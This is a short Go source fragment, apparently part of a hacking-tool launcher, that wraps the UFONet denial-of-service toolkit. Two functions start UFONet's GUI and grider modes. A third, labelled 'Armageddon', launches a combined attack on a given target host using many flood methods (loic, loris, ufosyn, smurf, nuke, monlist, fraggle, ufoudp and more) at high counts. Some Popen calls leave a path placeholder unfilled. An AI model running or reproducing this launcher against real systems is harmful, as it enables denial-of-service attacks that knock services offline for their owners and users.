func Ufonet7() {
    fmt.Printf("\n%s[*] %sLaunched ufonet UI on http://localhost:9999 ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/ufonet/; python3 ufonet --gui`)
}

func Ufonet8() {
    fmt.Printf("\n%s[*] %sStarted Grider ufonet --grider ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/ufonet/; python3 ufonet --grider`)
}

func Ufonet9(Rhost string) {
    fmt.Printf("\n%s[*] %sLaunched Armageddon! with All! ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/ufonet/; python3 ufonet -r "100" --threads "100" --loic "1000" --loris "1000" --ufosyn "1000" --spray "1000" --smurf "1000" --xmas "1000" --nuke "1000" --tachyon "1000" --monlist "1000" --fraggle "1000" --sniper "1000" --ufoack "1000" --uforst "1000" --droper "1000" --overlap "1000" --pinger "1000" --ufoudp "1000" -a "%s"`, ToolsDir, Rhost)
}

